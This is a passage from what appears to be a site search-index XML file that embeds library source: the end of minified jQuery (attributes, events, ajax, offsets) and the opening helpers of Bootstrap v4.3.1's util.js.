k.removeAttr(e, t) : i && "set" in i && void 0 !== (r = i.set(e, n, t)) ? r : (e.setAttribute(t, n + ""), n) : i && "get" in i && null !== (r = i.get(e, t)) ? r : null == (r = k.find.attr(e, t)) ? void 0 : r) }, attrHooks: { type: { set: function (e, t) { if (!y.radioValue && "radio" === t && A(e, "input")) { var n = e.value; return e.setAttribute("type", t), n && (e.value = n), t } } } }, removeAttr: function (e, t) { var n, r = 0, i = t && t.match(R); if (i && 1 === e.nodeType) while (n = i[r++]) e.removeAttribute(n) } }), ht = { set: function (e, t, n) { return !1 === t ? k.removeAttr(e, n) : e.setAttribute(n, n), n } }, k.each(k.expr.match.bool.source.match(/\w+/g), function (e, t) { var a = gt[t] || k.find.attr; gt[t] = function (e, t, n) { var r, i, o = t.toLowerCase(); return n || (i = gt[o], gt[o] = r, r = null != a(e, t, n) ? o : null, gt[o] = i), r } }); var vt = /^(?:input|select|textarea|button)$/i, yt = /^(?:a|area)$/i; function mt(e) { return (e.match(R) || []).join(" ") } function xt(e) { return e.getAttribute && e.getAttribute("class") || "" } function bt(e) { return Array.isArray(e) ? e : "string" == typeof e && e.match(R) || [] } k.fn.extend({ prop: function (e, t) { return _(this, k.prop, e, t, 1 < arguments.length) }, removeProp: function (e) { return this.each(function () { delete this[k.propFix[e] || e] }) } }), k.extend({ prop: function (e, t, n) { var r, i, o = e.nodeType; if (3 !== o && 8 !== o && 2 !== o) return 1 === o && k.isXMLDoc(e) || (t = k.propFix[t] || t, i = k.propHooks[t]), void 0 !== n ? i && "set" in i && void 0 !== (r = i.set(e, n, t)) ? r : e[t] = n : i && "get" in i && null !== (r = i.get(e, t)) ? r : e[t] }, propHooks: { tabIndex: { get: function (e) { var t = k.find.attr(e, "tabindex"); return t ? parseInt(t, 10) : vt.test(e.nodeName) || yt.test(e.nodeName) && e.href ? 0 : -1 } } }, propFix: { "for": "htmlFor", "class": "className" } }), y.optSelected || (k.propHooks.selected = { get: function (e) { var t = e.parentNode; return t && t.parentNode && t.parentNode.selectedIndex, null }, set: function (e) { var t = e.parentNode; t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex) } }), k.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function () { k.propFix[this.toLowerCase()] = this }), k.fn.extend({ addClass: function (t) { var e, n, r, i, o, a, s, u = 0; if (m(t)) return this.each(function (e) { k(this).addClass(t.call(this, e, xt(this))) }); if ((e = bt(t)).length) while (n = this[u++]) if (i = xt(n), r = 1 === n.nodeType && " " + mt(i) + " ") { a = 0; while (o = e[a++]) r.indexOf(" " + o + " ") < 0 && (r += o + " "); i !== (s = mt(r)) && n.setAttribute("class", s) } return this }, removeClass: function (t) { var e, n, r, i, o, a, s, u = 0; if (m(t)) return this.each(function (e) { k(this).removeClass(t.call(this, e, xt(this))) }); if (!arguments.length) return this.attr("class", ""); if ((e = bt(t)).length) while (n = this[u++]) if (i = xt(n), r = 1 === n.nodeType && " " + mt(i) + " ") { a = 0; while (o = e[a++]) while (-1 < r.indexOf(" " + o + " ")) r = r.replace(" " + o + " ", " "); i !== (s = mt(r)) && n.setAttribute("class", s) } return this }, toggleClass: function (i, t) { var o = typeof i, a = "string" === o || Array.isArray(i); return "boolean" == typeof t && a ? t ? this.addClass(i) : this.removeClass(i) : m(i) ? this.each(function (e) { k(this).toggleClass(i.call(this, e, xt(this), t), t) }) : this.each(function () { var e, t, n, r; if (a) { t = 0, n = k(this), r = bt(i); while (e = r[t++]) n.hasClass(e) ? n.removeClass(e) : n.addClass(e) } else void 0 !== i && "boolean" !== o || ((e = xt(this)) && Q.set(this, "__className__", e), this.setAttribute && this.setAttribute("class", e || !1 === i ? "" : Q.get(this, "__className__") || "")) }) }, hasClass: function (e) { var t, n, r = 0; t = " " + e + " "; while (n = this[r++]) if (1 === n.nodeType && -1 < (" " + mt(xt(n)) + " ").indexOf(t)) return !0; return !1 } }); var wt = /\r/g; k.fn.extend({ val: function (n) { var r, e, i, t = this[0]; return arguments.length ? (i = m(n), this.each(function (e) { var t; 1 === this.nodeType && (null == (t = i ? n.call(this, e, k(this).val()) : n) ? t = "" : "number" == typeof t ? t += "" : Array.isArray(t) && (t = k.map(t, function (e) { return null == e ? "" : e + "" })), (r = k.valHooks[this.type] || k.valHooks[this.nodeName.toLowerCase()]) && "set" in r && void 0 !== r.set(this, t, "value") || (this.value = t)) })) : t ? (r = k.valHooks[t.type] || k.valHooks[t.nodeName.toLowerCase()]) && "get" in r && void 0 !== (e = r.get(t, "value")) ? e : "string" == typeof (e = t.value) ? e.replace(wt, "") : null == e ? "" : e : void 0 } }), k.extend({ valHooks: { option: { get: function (e) { var t = k.find.attr(e, "value"); return null != t ? t : mt(k.text(e)) } }, select: { get: function (e) { var t, n, r, i = e.options, o = e.selectedIndex, a = "select-one" === e.type, s = a ? null : [], u = a ? o + 1 : i.length; for (r = o < 0 ? u : a ? o : 0; r < u; r++)if (((n = i[r]).selected || r === o) && !n.disabled && (!n.parentNode.disabled || !A(n.parentNode, "optgroup"))) { if (t = k(n).val(), a) return t; s.push(t) } return s }, set: function (e, t) { var n, r, i = e.options, o = k.makeArray(t), a = i.length; while (a--) ((r = i[a]).selected = -1 < k.inArray(k.valHooks.option.get(r), o)) && (n = !0); return n || (e.selectedIndex = -1), o } } } }), k.each(["radio", "checkbox"], function () { k.valHooks[this] = { set: function (e, t) { if (Array.isArray(t)) return e.checked = -1 < k.inArray(k(e).val(), t) } }, y.checkOn || (k.valHooks[this].get = function (e) { return null === e.getAttribute("value") ? "on" : e.value }) }), y.focusin = "onfocusin" in C; var Tt = /^(?:focusinfocus|focusoutblur)$/, Ct = function (e) { e.stopPropagation() }; k.extend(k.event, { trigger: function (e, t, n, r) { var i, o, a, s, u, l, c, f, p = [n || E], d = v.call(e, "type") ? e.type : e, h = v.call(e, "namespace") ? e.namespace.split(".") : []; if (o = f = a = n = n || E, 3 !== n.nodeType && 8 !== n.nodeType && !Tt.test(d + k.event.triggered) && (-1 < d.indexOf(".") && (d = (h = d.split(".")).shift(), h.sort()), u = d.indexOf(":") < 0 && "on" + d, (e = e[k.expando] ? e : new k.Event(d, "object" == typeof e && e)).isTrigger = r ? 2 : 3, e.namespace = h.join("."), e.rnamespace = e.namespace ? new RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, e.result = void 0, e.target || (e.target = n), t = null == t ? [e] : k.makeArray(t, [e]), c = k.event.special[d] || {}, r || !c.trigger || !1 !== c.trigger.apply(n, t))) { if (!r && !c.noBubble && !x(n)) { for (s = c.delegateType || d, Tt.test(s + d) || (o = o.parentNode); o; o = o.parentNode)p.push(o), a = o; a === (n.ownerDocument || E) && p.push(a.defaultView || a.parentWindow || C) } i = 0; while ((o = p[i++]) && !e.isPropagationStopped()) f = o, e.type = 1 < i ? s : c.bindType || d, (l = (Q.get(o, "events") || {})[e.type] && Q.get(o, "handle")) && l.apply(o, t), (l = u && o[u]) && l.apply && G(o) && (e.result = l.apply(o, t), !1 === e.result && e.preventDefault()); return e.type = d, r || e.isDefaultPrevented() || c._default && !1 !== c._default.apply(p.pop(), t) || !G(n) || u && m(n[d]) && !x(n) && ((a = n[u]) && (n[u] = null), k.event.triggered = d, e.isPropagationStopped() && f.addEventListener(d, Ct), n[d](), e.isPropagationStopped() && f.removeEventListener(d, Ct), k.event.triggered = void 0, a && (n[u] = a)), e.result } }, simulate: function (e, t, n) { var r = k.extend(new k.Event, n, { type: e, isSimulated: !0 }); k.event.trigger(r, null, t) } }), k.fn.extend({ trigger: function (e, t) { return this.each(function () { k.event.trigger(e, t, this) }) }, triggerHandler: function (e, t) { var n = this[0]; if (n) return k.event.trigger(e, t, n, !0) } }), y.focusin || k.each({ focus: "focusin", blur: "focusout" }, function (n, r) { var i = function (e) { k.event.simulate(r, e.target, k.event.fix(e)) }; k.event.special[r] = { setup: function () { var e = this.ownerDocument || this, t = Q.access(e, r); t || e.addEventListener(n, i, !0), Q.access(e, r, (t || 0) + 1) }, teardown: function () { var e = this.ownerDocument || this, t = Q.access(e, r) - 1; t ? Q.access(e, r, t) : (e.removeEventListener(n, i, !0), Q.remove(e, r)) } } }); var Et = C.location, kt = Date.now(), St = /\?/; k.parseXML = function (e) { var t; if (!e || "string" != typeof e) return null; try { t = (new C.DOMParser).parseFromString(e, "text/xml") } catch (e) { t = void 0 } return t && !t.getElementsByTagName("parsererror").length || k.error("Invalid XML: " + e), t }; var Nt = /\[\]$/, At = /\r?\n/g, Dt = /^(?:submit|button|image|reset|file)$/i, jt = /^(?:input|select|textarea|keygen)/i; function qt(n, e, r, i) { var t; if (Array.isArray(e)) k.each(e, function (e, t) { r || Nt.test(n) ? i(n, t) : qt(n + "[" + ("object" == typeof t && null != t ? e : "") + "]", t, r, i) }); else if (r || "object" !== w(e)) i(n, e); else for (t in e) qt(n + "[" + t + "]", e[t], r, i) } k.param = function (e, t) { var n, r = [], i = function (e, t) { var n = m(t) ? t() : t; r[r.length] = encodeURIComponent(e) + "=" + encodeURIComponent(null == n ? "" : n) }; if (null == e) return ""; if (Array.isArray(e) || e.jquery && !k.isPlainObject(e)) k.each(e, function () { i(this.name, this.value) }); else for (n in e) qt(n, e[n], t, i); return r.join("&") }, k.fn.extend({ serialize: function () { return k.param(this.serializeArray()) }, serializeArray: function () { return this.map(function () { var e = k.prop(this, "elements"); return e ? k.makeArray(e) : this }).filter(function () { var e = this.type; return this.name && !k(this).is(":disabled") && jt.test(this.nodeName) && !Dt.test(e) && (this.checked || !pe.test(e)) }).map(function (e, t) { var n = k(this).val(); return null == n ? null : Array.isArray(n) ? k.map(n, function (e) { return { name: t.name, value: e.replace(At, "\r\n") } }) : { name: t.name, value: n.replace(At, "\r\n") } }).get() } }); var Lt = /%20/g, Ht = /#.*$/, Ot = /([?&])_=[^&]*/, Pt = /^(.*?):[ \t]*([^\r\n]*)$/gm, Rt = /^(?:GET|HEAD)$/, Mt = /^\/\//, It = {}, Wt = {}, $t = "*/".concat("*"), Ft = E.createElement("a"); function Bt(o) { return function (e, t) { "string" != typeof e && (t = e, e = "*"); var n, r = 0, i = e.toLowerCase().match(R) || []; if (m(t)) while (n = i[r++]) "+" === n[0] ? (n = n.slice(1) || "*", (o[n] = o[n] || []).unshift(t)) : (o[n] = o[n] || []).push(t) } } function _t(t, i, o, a) { var s = {}, u = t === Wt; function l(e) { var r; return s[e] = !0, k.each(t[e] || [], function (e, t) { var n = t(i, o, a); return "string" != typeof n || u || s[n] ? u ? !(r = n) : void 0 : (i.dataTypes.unshift(n), l(n), !1) }), r } return l(i.dataTypes[0]) || !s["*"] && l("*") } function zt(e, t) { var n, r, i = k.ajaxSettings.flatOptions || {}; for (n in t) void 0 !== t[n] && ((i[n] ? e : r || (r = {}))[n] = t[n]); return r && k.extend(!0, e, r), e } Ft.href = Et.href, k.extend({ active: 0, lastModified: {}, etag: {}, ajaxSettings: { url: Et.href, type: "GET", isLocal: /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(Et.protocol), global: !0, processData: !0, async: !0, contentType: "application/x-www-form-urlencoded; charset=UTF-8", accepts: { "*": $t, text: "text/plain", html: "text/html", xml: "application/xml, text/xml", json: "application/json, text/javascript" }, contents: { xml: /\bxml\b/, html: /\bhtml/, json: /\bjson\b/ }, responseFields: { xml: "responseXML", text: "responseText", json: "responseJSON" }, converters: { "* text": String, "text html": !0, "text json": JSON.parse, "text xml": k.parseXML }, flatOptions: { url: !0, context: !0 } }, ajaxSetup: function (e, t) { return t ? zt(zt(e, k.ajaxSettings), t) : zt(k.ajaxSettings, e) }, ajaxPrefilter: Bt(It), ajaxTransport: Bt(Wt), ajax: function (e, t) { "object" == typeof e && (t = e, e = void 0), t = t || {}; var c, f, p, n, d, r, h, g, i, o, v = k.ajaxSetup({}, t), y = v.context || v, m = v.context && (y.nodeType || y.jquery) ? k(y) : k.event, x = k.Deferred(), b = k.Callbacks("once memory"), w = v.statusCode || {}, a = {}, s = {}, u = "canceled", T = { readyState: 0, getResponseHeader: function (e) { var t; if (h) { if (!n) { n = {}; while (t = Pt.exec(p)) n[t[1].toLowerCase() + " "] = (n[t[1].toLowerCase() + " "] || []).concat(t[2]) } t = n[e.toLowerCase() + " "] } return null == t ? null : t.join(", ") }, getAllResponseHeaders: function () { return h ? p : null }, setRequestHeader: function (e, t) { return null == h && (e = s[e.toLowerCase()] = s[e.toLowerCase()] || e, a[e] = t), this }, overrideMimeType: function (e) { return null == h && (v.mimeType = e), this }, statusCode: function (e) { var t; if (e) if (h) T.always(e[T.status]); else for (t in e) w[t] = [w[t], e[t]]; return this }, abort: function (e) { var t = e || u; return c && c.abort(t), l(0, t), this } }; if (x.promise(T), v.url = ((e || v.url || Et.href) + "").replace(Mt, Et.protocol + "//"), v.type = t.method || t.type || v.method || v.type, v.dataTypes = (v.dataType || "*").toLowerCase().match(R) || [""], null == v.crossDomain) { r = E.createElement("a"); try { r.href = v.url, r.href = r.href, v.crossDomain = Ft.protocol + "//" + Ft.host != r.protocol + "//" + r.host } catch (e) { v.crossDomain = !0 } } if (v.data && v.processData && "string" != typeof v.data && (v.data = k.param(v.data, v.traditional)), _t(It, v, t, T), h) return T; for (i in (g = k.event && v.global) && 0 == k.active++ && k.event.trigger("ajaxStart"), v.type = v.type.toUpperCase(), v.hasContent = !Rt.test(v.type), f = v.url.replace(Ht, ""), v.hasContent ? v.data && v.processData && 0 === (v.contentType || "").indexOf("application/x-www-form-urlencoded") && (v.data = v.data.replace(Lt, "+")) : (o = v.url.slice(f.length), v.data && (v.processData || "string" == typeof v.data) && (f += (St.test(f) ? "&" : "?") + v.data, delete v.data), !1 === v.cache && (f = f.replace(Ot, "$1"), o = (St.test(f) ? "&" : "?") + "_=" + kt++ + o), v.url = f + o), v.ifModified && (k.lastModified[f] && T.setRequestHeader("If-Modified-Since", k.lastModified[f]), k.etag[f] && T.setRequestHeader("If-None-Match", k.etag[f])), (v.data && v.hasContent && !1 !== v.contentType || t.contentType) && T.setRequestHeader("Content-Type", v.contentType), T.setRequestHeader("Accept", v.dataTypes[0] && v.accepts[v.dataTypes[0]] ? v.accepts[v.dataTypes[0]] + ("*" !== v.dataTypes[0] ? ", " + $t + "; q=0.01" : "") : v.accepts["*"]), v.headers) T.setRequestHeader(i, v.headers[i]); if (v.beforeSend && (!1 === v.beforeSend.call(y, T, v) || h)) return T.abort(); if (u = "abort", b.add(v.complete), T.done(v.success), T.fail(v.error), c = _t(Wt, v, t, T)) { if (T.readyState = 1, g && m.trigger("ajaxSend", [T, v]), h) return T; v.async && 0 < v.timeout && (d = C.setTimeout(function () { T.abort("timeout") }, v.timeout)); try { h = !1, c.send(a, l) } catch (e) { if (h) throw e; l(-1, e) } } else l(-1, "No Transport"); function l(e, t, n, r) { var i, o, a, s, u, l = t; h || (h = !0, d && C.clearTimeout(d), c = void 0, p = r || "", T.readyState = 0 < e ? 4 : 0, i = 200 <= e && e < 300 || 304 === e, n && (s = function (e, t, n) { var r, i, o, a, s = e.contents, u = e.dataTypes; while ("*" === u[0]) u.shift(), void 0 === r && (r = e.mimeType || t.getResponseHeader("Content-Type")); if (r) for (i in s) if (s[i] && s[i].test(r)) { u.unshift(i); break } if (u[0] in n) o = u[0]; else { for (i in n) { if (!u[0] || e.converters[i + " " + u[0]]) { o = i; break } a || (a = i) } o = o || a } if (o) return o !== u[0] && u.unshift(o), n[o] }(v, T, n)), s = function (e, t, n, r) { var i, o, a, s, u, l = {}, c = e.dataTypes.slice(); if (c[1]) for (a in e.converters) l[a.toLowerCase()] = e.converters[a]; o = c.shift(); while (o) if (e.responseFields[o] && (n[e.responseFields[o]] = t), !u && r && e.dataFilter && (t = e.dataFilter(t, e.dataType)), u = o, o = c.shift()) if ("*" === o) o = u; else if ("*" !== u && u !== o) { if (!(a = l[u + " " + o] || l["* " + o])) for (i in l) if ((s = i.split(" "))[1] === o && (a = l[u + " " + s[0]] || l["* " + s[0]])) { !0 === a ? a = l[i] : !0 !== l[i] && (o = s[0], c.unshift(s[1])); break } if (!0 !== a) if (a && e["throws"]) t = a(t); else try { t = a(t) } catch (e) { return { state: "parsererror", error: a ? e : "No conversion from " + u + " to " + o } } } return { state: "success", data: t } }(v, s, T, i), i ? (v.ifModified && ((u = T.getResponseHeader("Last-Modified")) && (k.lastModified[f] = u), (u = T.getResponseHeader("etag")) && (k.etag[f] = u)), 204 === e || "HEAD" === v.type ? l = "nocontent" : 304 === e ? l = "notmodified" : (l = s.state, o = s.data, i = !(a = s.error))) : (a = l, !e && l || (l = "error", e < 0 && (e = 0))), T.status = e, T.statusText = (t || l) + "", i ? x.resolveWith(y, [o, l, T]) : x.rejectWith(y, [T, l, a]), T.statusCode(w), w = void 0, g && m.trigger(i ? "ajaxSuccess" : "ajaxError", [T, v, i ? o : a]), b.fireWith(y, [T, l]), g && (m.trigger("ajaxComplete", [T, v]), --k.active || k.event.trigger("ajaxStop"))) } return T }, getJSON: function (e, t, n) { return k.get(e, t, n, "json") }, getScript: function (e, t) { return k.get(e, void 0, t, "script") } }), k.each(["get", "post"], function (e, i) { k[i] = function (e, t, n, r) { return m(t) && (r = r || n, n = t, t = void 0), k.ajax(k.extend({ url: e, type: i, dataType: r, data: t, success: n }, k.isPlainObject(e) && e)) } }), k._evalUrl = function (e, t) { return k.ajax({ url: e, type: "GET", dataType: "script", cache: !0, async: !1, global: !1, converters: { "text script": function () { } }, dataFilter: function (e) { k.globalEval(e, t) } }) }, k.fn.extend({ wrapAll: function (e) { var t; return this[0] && (m(e) && (e = e.call(this[0])), t = k(e, this[0].ownerDocument).eq(0).clone(!0), this[0].parentNode && t.insertBefore(this[0]), t.map(function () { var e = this; while (e.firstElementChild) e = e.firstElementChild; return e }).append(this)), this }, wrapInner: function (n) { return m(n) ? this.each(function (e) { k(this).wrapInner(n.call(this, e)) }) : this.each(function () { var e = k(this), t = e.contents(); t.length ? t.wrapAll(n) : e.append(n) }) }, wrap: function (t) { var n = m(t); return this.each(function (e) { k(this).wrapAll(n ? t.call(this, e) : t) }) }, unwrap: function (e) { return this.parent(e).not("body").each(function () { k(this).replaceWith(this.childNodes) }), this } }), k.expr.pseudos.hidden = function (e) { return !k.expr.pseudos.visible(e) }, k.expr.pseudos.visible = function (e) { return !!(e.offsetWidth || e.offsetHeight || e.getClientRects().length) }, k.ajaxSettings.xhr = function () { try { return new C.XMLHttpRequest } catch (e) { } }; var Ut = { 0: 200, 1223: 204 }, Xt = k.ajaxSettings.xhr(); y.cors = !!Xt && "withCredentials" in Xt, y.ajax = Xt = !!Xt, k.ajaxTransport(function (i) { var o, a; if (y.cors || Xt && !i.crossDomain) return { send: function (e, t) { var n, r = i.xhr(); if (r.open(i.type, i.url, i.async, i.username, i.password), i.xhrFields) for (n in i.xhrFields) r[n] = i.xhrFields[n]; for (n in i.mimeType && r.overrideMimeType && r.overrideMimeType(i.mimeType), i.crossDomain || e["X-Requested-With"] || (e["X-Requested-With"] = "XMLHttpRequest"), e) r.setRequestHeader(n, e[n]); o = function (e) { return function () { o && (o = a = r.onload = r.onerror = r.onabort = r.ontimeout = r.onreadystatechange = null, "abort" === e ? r.abort() : "error" === e ? "number" != typeof r.status ? t(0, "error") : t(r.status, r.statusText) : t(Ut[r.status] || r.status, r.statusText, "text" !== (r.responseType || "text") || "string" != typeof r.responseText ? { binary: r.response } : { text: r.responseText }, r.getAllResponseHeaders())) } }, r.onload = o(), a = r.onerror = r.ontimeout = o("error"), void 0 !== r.onabort ? r.onabort = a : r.onreadystatechange = function () { 4 === r.readyState && C.setTimeout(function () { o && a() }) }, o = o("abort"); try { r.send(i.hasContent && i.data || null) } catch (e) { if (o) throw e } }, abort: function () { o && o() } } }), k.ajaxPrefilter(function (e) { e.crossDomain && (e.contents.script = !1) }), k.ajaxSetup({ accepts: { script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript" }, contents: { script: /\b(?:java|ecma)script\b/ }, converters: { "text script": function (e) { return k.globalEval(e), e } } }), k.ajaxPrefilter("script", function (e) { void 0 === e.cache && (e.cache = !1), e.crossDomain && (e.type = "GET") }), k.ajaxTransport("script", function (n) { var r, i; if (n.crossDomain || n.scriptAttrs) return { send: function (e, t) { r = k("<script>").attr(n.scriptAttrs || {}).prop({ charset: n.scriptCharset, src: n.url }).on("load error", i = function (e) { r.remove(), i = null, e && t("error" === e.type ? 404 : 200, e.type) }), E.head.appendChild(r[0]) }, abort: function () { i && i() } } }); var Vt, Gt = [], Yt = /(=)\?(?=&|$)|\?\?/; k.ajaxSetup({ jsonp: "callback", jsonpCallback: function () { var e = Gt.pop() || k.expando + "_" + kt++; return this[e] = !0, e } }), k.ajaxPrefilter("json jsonp", function (e, t, n) { var r, i, o, a = !1 !== e.jsonp && (Yt.test(e.url) ? "url" : "string" == typeof e.data && 0 === (e.contentType || "").indexOf("application/x-www-form-urlencoded") && Yt.test(e.data) && "data"); if (a || "jsonp" === e.dataTypes[0]) return r = e.jsonpCallback = m(e.jsonpCallback) ? e.jsonpCallback() : e.jsonpCallback, a ? e[a] = e[a].replace(Yt, "$1" + r) : !1 !== e.jsonp && (e.url += (St.test(e.url) ? "&" : "?") + e.jsonp + "=" + r), e.converters["script json"] = function () { return o || k.error(r + " was not called"), o[0] }, e.dataTypes[0] = "json", i = C[r], C[r] = function () { o = arguments }, n.always(function () { void 0 === i ? k(C).removeProp(r) : C[r] = i, e[r] && (e.jsonpCallback = t.jsonpCallback, Gt.push(r)), o && m(i) && i(o[0]), o = i = void 0 }), "script" }), y.createHTMLDocument = ((Vt = E.implementation.createHTMLDocument("").body).innerHTML = "<form></form><form></form>", 2 === Vt.childNodes.length), k.parseHTML = function (e, t, n) { return "string" != typeof e ? [] : ("boolean" == typeof t && (n = t, t = !1), t || (y.createHTMLDocument ? ((r = (t = E.implementation.createHTMLDocument("")).createElement("base")).href = E.location.href, t.head.appendChild(r)) : t = E), o = !n && [], (i = D.exec(e)) ? [t.createElement(i[1])] : (i = we([e], t, o), o && o.length && k(o).remove(), k.merge([], i.childNodes))); var r, i, o }, k.fn.load = function (e, t, n) { var r, i, o, a = this, s = e.indexOf(" "); return -1 < s && (r = mt(e.slice(s)), e = e.slice(0, s)), m(t) ? (n = t, t = void 0) : t && "object" == typeof t && (i = "POST"), 0 < a.length && k.ajax({ url: e, type: i || "GET", dataType: "html", data: t }).done(function (e) { o = arguments, a.html(r ? k("<div>").append(k.parseHTML(e)).find(r) : e) }).always(n && function (e, t) { a.each(function () { n.apply(this, o || [e.responseText, t, e]) }) }), this }, k.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function (e, t) { k.fn[t] = function (e) { return this.on(t, e) } }), k.expr.pseudos.animated = function (t) { return k.grep(k.timers, function (e) { return t === e.elem }).length }, k.offset = { setOffset: function (e, t, n) { var r, i, o, a, s, u, l = k.css(e, "position"), c = k(e), f = {}; "static" === l && (e.style.position = "relative"), s = c.offset(), o = k.css(e, "top"), u = k.css(e, "left"), ("absolute" === l || "fixed" === l) && -1 < (o + u).indexOf("auto") ? (a = (r = c.position()).top, i = r.left) : (a = parseFloat(o) || 0, i = parseFloat(u) || 0), m(t) && (t = t.call(e, n, k.extend({}, s))), null != t.top && (f.top = t.top - s.top + a), null != t.left && (f.left = t.left - s.left + i), "using" in t ? t.using.call(e, f) : c.css(f) } }, k.fn.extend({ offset: function (t) { if (arguments.length) return void 0 === t ? this : this.each(function (e) { k.offset.setOffset(this, t, e) }); var e, n, r = this[0]; return r ? r.getClientRects().length ? (e = r.getBoundingClientRect(), n = r.ownerDocument.defaultView, { top: e.top + n.pageYOffset, left: e.left + n.pageXOffset }) : { top: 0, left: 0 } : void 0 }, position: function () { if (this[0]) { var e, t, n, r = this[0], i = { top: 0, left: 0 }; if ("fixed" === k.css(r, "position")) t = r.getBoundingClientRect(); else { t = this.offset(), n = r.ownerDocument, e = r.offsetParent || n.documentElement; while (e && (e === n.body || e === n.documentElement) && "static" === k.css(e, "position")) e = e.parentNode; e && e !== r && 1 === e.nodeType && ((i = k(e).offset()).top += k.css(e, "borderTopWidth", !0), i.left += k.css(e, "borderLeftWidth", !0)) } return { top: t.top - i.top - k.css(r, "marginTop", !0), left: t.left - i.left - k.css(r, "marginLeft", !0) } } }, offsetParent: function () { return this.map(function () { var e = this.offsetParent; while (e && "static" === k.css(e, "position")) e = e.offsetParent; return e || ie }) } }), k.each({ scrollLeft: "pageXOffset", scrollTop: "pageYOffset" }, function (t, i) { var o = "pageYOffset" === i; k.fn[t] = function (e) { return _(this, function (e, t, n) { var r; if (x(e) ? r = e : 9 === e.nodeType && (r = e.defaultView), void 0 === n) return r ? r[i] : e[t]; r ? r.scrollTo(o ? r.pageXOffset : n, o ? n : r.pageYOffset) : e[t] = n }, t, e, arguments.length) } }), k.each(["top", "left"], function (e, n) { k.cssHooks[n] = ze(y.pixelPosition, function (e, t) { if (t) return t = _e(e, n), $e.test(t) ? k(e).position()[n] + "px" : t }) }), k.each({ Height: "height", Width: "width" }, function (a, s) { k.each({ padding: "inner" + a, content: s, "": "outer" + a }, function (r, o) { k.fn[o] = function (e, t) { var n = arguments.length && (r || "boolean" != typeof e), i = r || (!0 === e || !0 === t ? "margin" : "border"); return _(this, function (e, t, n) { var r; return x(e) ? 0 === o.indexOf("outer") ? e["inner" + a] : e.document.documentElement["client" + a] : 9 === e.nodeType ? (r = e.documentElement, Math.max(e.body["scroll" + a], r["scroll" + a], e.body["offset" + a], r["offset" + a], r["client" + a])) : void 0 === n ? k.css(e, t, i) : k.style(e, t, n, i) }, s, n ? e : void 0, n) } }) }), k.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "), function (e, n) { k.fn[n] = function (e, t) { return 0 < arguments.length ? this.on(n, null, e, t) : this.trigger(n) } }), k.fn.extend({ hover: function (e, t) { return this.mouseenter(e).mouseleave(t || e) } }), k.fn.extend({ bind: function (e, t, n) { return this.on(e, null, t, n) }, unbind: function (e, t) { return this.off(e, null, t) }, delegate: function (e, t, n, r) { return this.on(t, e, n, r) }, undelegate: function (e, t, n) { return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", n) } }), k.proxy = function (e, t) { var n, r, i; if ("string" == typeof t && (n = e[t], t = e, e = n), m(e)) return r = s.call(arguments, 2), (i = function () { return e.apply(t || this, r.concat(s.call(arguments))) }).guid = e.guid = e.guid || k.guid++, i }, k.holdReady = function (e) { e ? k.readyWait++ : k.ready(!0) }, k.isArray = Array.isArray, k.parseJSON = JSON.parse, k.nodeName = A, k.isFunction = m, k.isWindow = x, k.camelCase = V, k.type = w, k.now = Date.now, k.isNumeric = function (e) { var t = k.type(e); return ("number" === t || "string" === t) && !isNaN(e - parseFloat(e)) }, "function" == typeof define && define.amd && define("jquery", [], function () { return k }); var Qt = C.jQuery, Jt = C.$; return k.noConflict = function (e) { return C.$ === k && (C.$ = Jt), e && C.jQuery === k && (C.jQuery = Qt), k }, e || (C.jQuery = C.$ = k), k });]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/sources/js/bootstrap.js"/>
      <url>/sources/js/bootstrap.js</url>
      
        <content type="html"><![CDATA[/*!  * Bootstrap v4.3.1 (https://getbootstrap.com/)  * Copyright 2011-2019 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)  * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)  */(function (global, factory) {  typeof exports === 'object' && typeof module !== 'undefined' ? factory(exports, require('jquery'), require('popper.js')) :    typeof define === 'function' && define.amd ? define(['exports', 'jquery', 'popper.js'], factory) :      (global = global || self, factory(global.bootstrap = {}, global.jQuery, global.Popper));}(this, function (exports, $, Popper) {  'use strict';  $ = $ && $.hasOwnProperty('default') ? $['default'] : $;  Popper = Popper && Popper.hasOwnProperty('default') ? Popper['default'] : Popper;  function _defineProperties(target, props) {    for (var i = 0; i < props.length; i++) {      var descriptor = props[i];      descriptor.enumerable = descriptor.enumerable || false;      descriptor.configurable = true;      if ("value" in descriptor) descriptor.writable = true;      Object.defineProperty(target, descriptor.key, descriptor);    }  }  function _createClass(Constructor, protoProps, staticProps) {    if (protoProps) _defineProperties(Constructor.prototype, protoProps);    if (staticProps) _defineProperties(Constructor, staticProps);    return Constructor;  }  function _defineProperty(obj, key, value) {    if (key in obj) {      Object.defineProperty(obj, key, {        value: value,        enumerable: true,        configurable: true,        writable: true      });    } else {      obj[key] = value;    }    return obj;  }  function _objectSpread(target) {    for (var i = 1; i < arguments.length; i++) {      var source = arguments[i] != null ? arguments[i] : {};      var ownKeys = Object.keys(source);      if (typeof Object.getOwnPropertySymbols === 'function') {        ownKeys = ownKeys.concat(Object.getOwnPropertySymbols(source).filter(function (sym) {          return Object.getOwnPropertyDescriptor(source, sym).enumerable;        }));      }      ownKeys.forEach(function (key) {        _defineProperty(target, key, source[key]);      });    }    return target;  }  function _inheritsLoose(subClass, superClass) {    subClass.prototype = Object.create(superClass.prototype);    subClass.prototype.constructor = subClass;    subClass.__proto__ = superClass;  }  /**   * --------------------------------------------------------------------------   * Bootstrap (v4.3.1): util.js   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)   * --------------------------------------------------------------------------   */  /**   * ------------------------------------------------------------------------   * Private TransitionEnd Helpers   * ------------------------------------------------------------------------   */  var TRANSITION_END = 'transitionend';  var MAX_UID = 1000000;  var MILLISECONDS_MULTIPLIER = 1000; // Shoutout AngusCroll (https://goo.gl/pxwQGp)  function toType(obj) {    return {}.toString.call(obj).match(/\s([a-z]+)/i)[1].toLowerCase();  }  